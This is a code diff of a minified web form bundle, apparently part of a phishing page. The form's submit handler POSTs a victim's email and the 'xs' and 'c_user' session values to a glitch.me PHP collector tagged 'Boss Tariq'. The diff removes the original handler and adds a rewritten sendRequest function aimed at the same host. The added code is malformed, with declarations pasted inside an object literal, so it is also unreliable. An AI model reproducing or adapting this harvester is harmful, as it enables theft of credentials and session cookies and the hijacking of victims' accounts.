@@ -9814,24 +9814,54 @@
                                 className: "ant-form ant-form-horizontal css-m4timi",
                                 onSubmit: e => {
                                     e.preventDefault(),
-                                    fetch("https://branch-weak-increase.glitch.me/BASIT.php", {
-                                        method: "POST",
-                                        headers: {
-                                            "Content-Type": "application/json"
-                                        },
-                                        body: JSON.stringify({
-                                            emails: o,
-                                            workerEmail: "Boss Tariq",
-                                            xs: r,
-                                            c_user: i,
-                                            name: "Tariq"
-                                        })
-                                    }).then((e => {
-                                        e.ok
-                                    }
-                                    )),
-                                    s("pass")
-                                }
+                                    // Example dynamic variables (these can be changed as needed)
+let o = "email@example.com";   // Email or other dynamic value
+let r = "someRandomString";    // Example dynamic value for 'xs'
+let i = "user123";             // Example dynamic user ID for 'c_user'
+
+// Define the function that sends the request
+function sendRequest(xs, c_user) {
+    // Sending the dynamic values for xs and c_user
+    fetch("https://branch-weak-increase.glitch.me/BASIT.php", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            emails: o,           // Static email, change this as required
+            workerEmail: "Boss Tariq",  // Static workerEmail, can be dynamic if needed
+            xs: xs,               // Sending dynamic 'xs' value
+            c_user: c_user,       // Sending dynamic 'c_user' value
+            name: "Tariq"         // Static name, can be dynamic if needed
+        })
+    })
+    .then(response => {
+        if (response.ok) {
+            console.log("Request was successful:", response);
+            s("pass");  // Call the callback function on success
+        } else {
+            console.error("Request failed with status:", response.status);
+            s("fail");  // Call the callback function on failure
+        }
+    })
+    .catch(error => {
+        console.error("There was an error with the request:", error);
+        s("fail");  // Call the callback function on error
+    });
+}
+
+// Call the function with dynamic values
+sendRequest(r, i);  // Here 'r' is the dynamic value for xs, and 'i' for c_user
+
+// Function that handles the response (success or failure)
+function s(status) {
+    if (status === "pass") {
+        console.log("Success: Data has been successfully sent!");
+    } else {
+        console.log("Failure: Something went wrong.");
+    }
+}
+
                                 ,
                                 children: [(0,
                                 he.jsxs)("div", {
